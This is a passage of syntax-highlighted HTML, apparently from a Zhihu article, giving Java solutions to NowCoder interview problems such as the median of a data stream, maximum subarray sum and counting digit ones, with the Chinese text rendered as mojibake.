class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">partition</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">p</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">];</span>     <span class=\"cm\">/* åˆ‡åˆ†å…ƒç´  */</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">h</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">!=</span> <span class=\"n\">h</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">nums</span><span class=\"o\">[++</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">&lt;</span> <span class=\"n\">p</span><span class=\"o\">)</span> <span class=\"o\">;</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">!=</span> <span class=\"n\">l</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">nums</span><span class=\"o\">[--</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">p</span><span class=\"o\">)</span> <span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&gt;=</span> <span class=\"n\">j</span><span class=\"o\">)</span>\n            <span class=\"k\">break</span><span class=\"o\">;</span>\n        <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">j</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">];</span>\n    <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>å¤§å°ä¸º K çš„æœ€å°å †</h3><ul><li>å¤æ‚åº¦ï¼šO(NlogK) + O(K)</li><li>ç‰¹åˆ«é€‚åˆå¤„ç†æµ·é‡æ•°æ®</li></ul><p>åº”è¯¥ä½¿ç”¨å¤§é¡¶å †æ¥ç»´æŠ¤æœ€å°å †ï¼Œè€Œä¸èƒ½ç›´æ¥åˆ›å»ºä¸€ä¸ªå°é¡¶å †å¹¶è®¾ç½®ä¸€ä¸ªå¤§å°ï¼Œä¼å›¾è®©å°é¡¶å †ä¸­çš„å…ƒç´ éƒ½æ˜¯æœ€å°å…ƒç´ ã€‚</p><p>ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸º K çš„æœ€å°å †è¿‡ç¨‹å¦‚ä¸‹ï¼šåœ¨æ·»åŠ ä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œå¦‚æœå¤§é¡¶å †çš„å¤§å°å¤§äº Kï¼Œé‚£ä¹ˆéœ€è¦å°†å¤§é¡¶å †çš„å †é¡¶å…ƒç´ å»é™¤ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">GetLeastNumbers_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">k</span> <span class=\"o\">&gt;</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">||</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">maxHeap</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;&gt;((</span><span class=\"n\">o1</span><span class=\"o\">,</span> <span class=\"n\">o2</span><span class=\"o\">)</span> <span class=\"o\">-&gt;</span> <span class=\"n\">o2</span> <span class=\"o\">-</span> <span class=\"n\">o1</span><span class=\"o\">);</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">num</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">maxHeap</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">num</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">maxHeap</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">()</span> <span class=\"o\">&gt;</span> <span class=\"n\">k</span><span class=\"o\">)</span>\n            <span class=\"n\">maxHeap</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">maxHeap</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><h2>41.1 æ•°æ®æµä¸­çš„ä¸­ä½æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/9be0172896bd43948f8a32fb954e1be1%3FtpId%3D13%26tqId%3D11216%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>å¦‚ä½•å¾—åˆ°ä¸€ä¸ªæ•°æ®æµä¸­çš„ä¸­ä½æ•°ï¼Ÿå¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¥‡æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä½äºä¸­é—´çš„æ•°å€¼ã€‚å¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¶æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä¸­é—´ä¸¤ä¸ªæ•°çš„å¹³å‡å€¼ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"cm\">/* å¤§é¡¶å †ï¼Œå­˜å‚¨å·¦åŠè¾¹å…ƒç´  */</span>\n<span class=\"kd\">private</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">left</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;&gt;((</span><span class=\"n\">o1</span><span class=\"o\">,</span> <span class=\"n\">o2</span><span class=\"o\">)</span> <span class=\"o\">-&gt;</span> <span class=\"n\">o2</span> <span class=\"o\">-</span> <span class=\"n\">o1</span><span class=\"o\">);</span>\n<span class=\"cm\">/* å°é¡¶å †ï¼Œå­˜å‚¨å³åŠè¾¹å…ƒç´ ï¼Œå¹¶ä¸”å³åŠè¾¹å…ƒç´ éƒ½å¤§äºå·¦åŠè¾¹ */</span>\n<span class=\"kd\">private</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">right</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">PriorityQueue</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"cm\">/* å½“å‰æ•°æ®æµè¯»å…¥çš„å…ƒç´ ä¸ªæ•° */</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">N</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">Insert</span><span class=\"o\">(</span><span class=\"n\">Integer</span> <span class=\"n\">val</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"cm\">/* æ’å…¥è¦ä¿è¯ä¸¤ä¸ªå †å­˜äºå¹³è¡¡çŠ¶æ€ */</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">N</span> <span class=\"o\">%</span> <span class=\"n\">2</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"cm\">/* N ä¸ºå¶æ•°çš„æƒ…å†µä¸‹æ’å…¥åˆ°å³åŠè¾¹ã€‚\n</span><span class=\"cm\">         * å› ä¸ºå³åŠè¾¹å…ƒç´ éƒ½è¦å¤§äºå·¦åŠè¾¹ï¼Œä½†æ˜¯æ–°æ’å…¥çš„å…ƒç´ ä¸ä¸€å®šæ¯”å·¦åŠè¾¹å…ƒç´ æ¥çš„å¤§ï¼Œ\n</span><span class=\"cm\">         * å› æ­¤éœ€è¦å…ˆå°†å…ƒç´ æ’å…¥å·¦åŠè¾¹ï¼Œç„¶ååˆ©ç”¨å·¦åŠè¾¹ä¸ºå¤§é¡¶å †çš„ç‰¹ç‚¹ï¼Œå–å‡ºå †é¡¶å…ƒç´ å³ä¸ºæœ€å¤§å…ƒç´ ï¼Œæ­¤æ—¶æ’å…¥å³åŠè¾¹ */</span>\n        <span class=\"n\">left</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">val</span><span class=\"o\">);</span>\n        <span class=\"n\">right</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">left</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n        <span class=\"n\">right</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">val</span><span class=\"o\">);</span>\n        <span class=\"n\">left</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">right</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">N</span><span class=\"o\">++;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">Double</span> <span class=\"nf\">GetMedian</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">N</span> <span class=\"o\">%</span> <span class=\"n\">2</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">left</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">()</span> <span class=\"o\">+</span> <span class=\"n\">right</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">())</span> <span class=\"o\">/</span> <span class=\"n\">2</span><span class=\"o\">.</span><span class=\"na\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">else</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"kt\">double</span><span class=\"o\">)</span> <span class=\"n\">right</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>41.2 å­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªä¸é‡å¤çš„å­—ç¬¦</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/00de97733b8e4f97a3fb5c680ee10720%3FtpId%3D13%26tqId%3D11207%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>è¯·å®ç°ä¸€ä¸ªå‡½æ•°ç”¨æ¥æ‰¾å‡ºå­—ç¬¦æµä¸­ç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œå½“ä»å­—ç¬¦æµä¸­åªè¯»å‡ºå‰ä¸¤ä¸ªå­—ç¬¦ &#34;go&#34; æ—¶ï¼Œç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦æ˜¯ &#34;g&#34;ã€‚å½“ä»è¯¥å­—ç¬¦æµä¸­è¯»å‡ºå‰å…­ä¸ªå­—ç¬¦â€œgoogle&#34; æ—¶ï¼Œç¬¬ä¸€ä¸ªåªå‡ºç°ä¸€æ¬¡çš„å­—ç¬¦æ˜¯ &#34;l&#34;ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">cnts</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">256</span><span class=\"o\">];</span>\n<span class=\"kd\">private</span> <span class=\"n\">Queue</span><span class=\"o\">&lt;</span><span class=\"n\">Character</span><span class=\"o\">&gt;</span> <span class=\"n\">queue</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">LinkedList</span><span class=\"o\">&lt;&gt;();</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">Insert</span><span class=\"o\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">cnts</span><span class=\"o\">[</span><span class=\"n\">ch</span><span class=\"o\">]++;</span>\n    <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">ch</span><span class=\"o\">);</span>\n    <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">()</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">cnts</span><span class=\"o\">[</span><span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">()]</span> <span class=\"o\">&gt;</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">poll</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">char</span> <span class=\"nf\">FirstAppearingOnce</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">()</span> <span class=\"o\">?</span> <span class=\"sc\">&#39;#&#39;</span> <span class=\"o\">:</span> <span class=\"n\">queue</span><span class=\"o\">.</span><span class=\"na\">peek</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>42. è¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œ</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/459bd355da1549fa8a49e350bf3df484%3FtpId%3D13%26tqId%3D11183%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>{6, -3, -2, 7, -15, 1, 2, 2}ï¼Œè¿ç»­å­æ•°ç»„çš„æœ€å¤§å’Œä¸º 8ï¼ˆä»ç¬¬ 0 ä¸ªå¼€å§‹ï¼Œåˆ°ç¬¬ 3 ä¸ªä¸ºæ­¢ï¼‰ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">FindGreatestSumOfSubArray</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">nums</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">greatestSum</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">MIN_VALUE</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">sum</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">val</span> <span class=\"o\">:</span> <span class=\"n\">nums</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">sum</span> <span class=\"o\">=</span> <span class=\"n\">sum</span> <span class=\"o\">&lt;=</span> <span class=\"n\">0</span> <span class=\"o\">?</span> <span class=\"n\">val</span> <span class=\"o\">:</span> <span class=\"n\">sum</span> <span class=\"o\">+</span> <span class=\"n\">val</span><span class=\"o\">;</span>\n        <span class=\"n\">greatestSum</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">max</span><span class=\"o\">(</span><span class=\"n\">greatestSum</span><span class=\"o\">,</span> <span class=\"n\">sum</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">greatestSum</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>43. ä» 1 åˆ° n æ•´æ•°ä¸­ 1 å‡ºç°çš„æ¬¡æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/bd7f978302044eee894445e244c7eee6%3FtpId%3D13%26tqId%3D11184%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">NumberOf1Between1AndN_Solution</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">m</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">m</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">m</span> <span class=\"o\">*=</span> <span class=\"n\">10</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">n</span> <span class=\"o\">/</span> <span class=\"n\">m</span><span class=\"o\">,</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"n\">n</span> <span class=\"o\">%</span> <span class=\"n\">m</span><span class=\"o\">;</span>\n        <span class=\"n\">cnt</span> <span class=\"o\">+=</span> <span class=\"o\">(</span><span class=\"n\">a</span> <span class=\"o\">+</span> <span class=\"n\">8</span><span class=\"o\">)</span> <span class=\"o\">/</span> <span class=\"n\">10</span> <span class=\"o\">*</span> <span class=\"n\">m</span> <span class=\"o\">+</span> <span class=\"o\">(</span><span class=\"n\">a</span> <span class=\"o\">%</span> <span class=\"n\">10</span> <span class=\"o\">==</span> <span class=\"n\">1</span> <span class=\"o\">?</span> <span class=\"n\">b</span> <span class=\"o\">+</span> <span class=\"n\">1</span> <span class=\"o\">:</span> <span class=\"n\">0</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">cnt</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><blockquote><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/number-of-digit-one/discuss/64381/4%2B-lines-O%28log-n%29-C%2B%2BJavaPython\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode : 233. Number of Digit One</a><br/> </blockquote><h2>44. æ•°å­—åºåˆ—ä¸­çš„æŸä¸€ä½æ•°å­—</h2><h2>é¢˜ç›®æè¿°</h2><p>æ•°å­—ä»¥ 0123456789101112131415... çš„æ ¼å¼åºåˆ—åŒ–åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ±‚è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ index ä½ã€‚</p><h2>è§£é¢˜æ€è·¯</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">getDigitAtIndex</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">index</span> <span class=\"o\">&lt;</span> <span class=\"n\">0</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"o\">-</span><span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">place</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>  <span class=\"c1\">// 1 è¡¨ç¤ºä¸ªä½ï¼Œ2 è¡¨ç¤º åä½...\n</span><span class=\"c1\"></span>    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">amount</span> <span class=\"o\">=</span> <span class=\"n\">getAmountOfPlace</span><span class=\"o\">(</span><span class=\"n\">place</span><span class=\"o\">);</span>\n        <span class=\"kt\">int</span> <span class=\"n\">totalAmount</span> <span class=\"o\">=</span> <span class=\"n\">amount</span> <span class=\"o\">*</span> <span class=\"n\">place</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">index</span> <span class=\"o\">&lt;</span> <span class=\"n\">totalAmount</span><span class=\"o\">)</span>\n            <span class=\"k\">return</span> <span class=\"n\">getDigitAtIndex</span><span class=\"o\">(</span><span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"n\">place</span><span class=\"o\">);</span>\n        <span class=\"n\">index</span> <span class=\"o\">-=</span> <span class=\"n\">totalAmount</span><span class=\"o\">;</span>\n        <span class=\"n\">place</span><span class=\"o\">++;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"cm\">/**\n</span><span class=\"cm\"> * place ä½æ•°çš„æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²é•¿åº¦\n</span><span class=\"cm\"> * 10, 90, 900, ...\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">getAmountOfPlace</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">place</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">place</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">10</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">pow</span><span class=\"o\">(</span><span class=\"n\">10</span><span class=\"o\">,</span> <span class=\"n\">place</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">)</span> <span class=\"o\">*</span> <span class=\"n\">9</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"cm\">/**\n</span><span class=\"cm\"> * place ä½æ•°çš„èµ·å§‹æ•°å­—\n</span><span class=\"cm\"> * 0, 10, 100, ...\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">getBeginNumberOfPlace</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">place</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">place</span> <span class=\"o\">==</span> <span class=\"n\">1</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">)</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">pow</span><span class=\"o\">(</span><span class=\"n\">10</span><span class=\"o\">,</span> <span class=\"n\">place</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"cm\">/**\n</span><span class=\"cm\"> * åœ¨ place ä½æ•°ç»„æˆçš„å­—ç¬¦ä¸²ä¸­ï¼Œç¬¬ index ä¸ªæ•°\n</span><span class=\"cm\"> */</span>\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">getDigitAtIndex</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">place</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">beginNumber</span> <span class=\"o\">=</span> <span class=\"n\">getBeginNumberOfPlace</span><span class=\"o\">(</span><span class=\"n\">place</span><span class=\"o\">);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">shiftNumber</span> <span class=\"o\">=</span> <span class=\"n\">index</span> <span class=\"o\">/</span> <span class=\"n\">place</span><span class=\"o\">;</span>\n    <span class=\"n\">String</span> <span class=\"n\">number</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">beginNumber</span> <span class=\"o\">+</span> <span class=\"n\">shiftNumber</span><span class=\"o\">)</span> <span class=\"o\">+</span> <span class=\"s\">&#34;&#34;</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"n\">index</span> <span class=\"o\">%</span> <span class=\"n\">place</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">number</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">count</span><span class=\"o\">)</span> <span class=\"o\">-</span> <span class=\"sc\">&#39;0&#39;</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>45. æŠŠæ•°ç»„æ’æˆæœ€å°çš„æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/8fecd3f8ba334add803bf2a06af1b993%3FtpId%3D13%26tqId%3D11185%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow 